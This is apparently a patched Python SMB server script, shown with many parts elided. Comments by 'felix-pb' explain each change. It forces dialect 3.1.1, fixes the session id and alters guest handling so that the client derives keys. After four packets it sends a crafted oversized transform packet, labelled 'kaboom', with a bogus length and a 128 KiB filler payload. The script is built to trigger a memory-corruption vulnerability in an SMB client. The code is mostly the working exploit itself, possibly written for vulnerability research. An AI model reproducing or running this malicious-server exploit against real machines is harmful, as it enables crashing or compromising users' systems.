...
class SMB2Commands:
    ...
    def smb2Negotiate(connId, smbServer, recvPacket, isSMB1=False):
        ...
        if isSMB1 is True:
            ...
            if b'SMB 2.002\x00' in dialects or b'SMB 2.???\x00' in dialects:
                # felix-pb: change dialect to v3.1.1
                respSMBCommand['DialectRevision'] = smb2.SMB2_DIALECT_311
            else:
            ...
            # felix-pb: change dialect to v3.1.1
            respSMBCommand['DialectRevision'] = smb2.SMB2_DIALECT_311
        # felix-pb: add 1 negotiate context because this is required for v3.1.1
        ...
        # felix-pb: the next three lines have been added by me.
        # - SecurityBufferLength is 30, so we need 2 bytes of padding for the negotiate context to be 8-byte aligned.
        # - NegotiateContextOffset is 128 + 32 = 0xA0.
        # - NegotiateContextList is for encryption, the cipher algorithm doesn't matter.
        respSMBCommand['Padding'] = b'\x00\x00'
        respSMBCommand['NegotiateContextOffset'] = 0xA0
        respSMBCommand['NegotiateContextList'] = b'\x02\x00\x04\x00\x00\x00\x00\x00\x01\x00\x01\x00'
    ...
    def smb2SessionSetup(connId, smbServer, recvPacket):
        ...
        if messageType == 0x01:
            ...
            # Picking a fixed value
            # TODO: Manage more UIDs for the same session
            # felix-pb: use a fixed session id instead of a random one.
            connData['Uid'] = 0xffffffff
            # Let's store it in the connection data
            connData['CHALLENGE_MESSAGE'] = challengeMessage
            ...
            if errorCode == STATUS_SUCCESS:
                ...
                if isGuest:
                    # felix-pb: this cannot be 1 if we want to turn on "derive_key" in "smb_gss_ssnsetup" (smb_gss.c)
...
# felix-pb: keep track of the number of packet we sent
# - after 4 packets (2 negotiate + 2 session setup), we want to send our malicious packet
packet_count = 0
                ...
                if p.get_type() == nmb.NETBIOS_SESSION_REQUEST:
                    ...
                    for i in resp:
                        if hasattr(i, 'getData'):
                            ...
                            # felix-pb: increment packet; after 4 packets send the malicious packet.
                            global packet_count
                            packet_count += 1
                            if packet_count == 4:
                                kaboom = (b'\xFDSMB' # transform header signature
                                        + b'\x00' * 32 # this is ignored before the vulnerability
                                        + b'\x01\x00\x01\x00' # this is matched
                                        + b'\x00\x00\x01\x00' # length = 64 KiB + 1
                                        + b'\xFF\xFF\xFF\xFF\x00\x00\x00\x00' # session id
                                        + b'A' * 128 * 1024) # 128 KiB paylaod
                                session.send_packet(kaboom)
            except Exception as e:
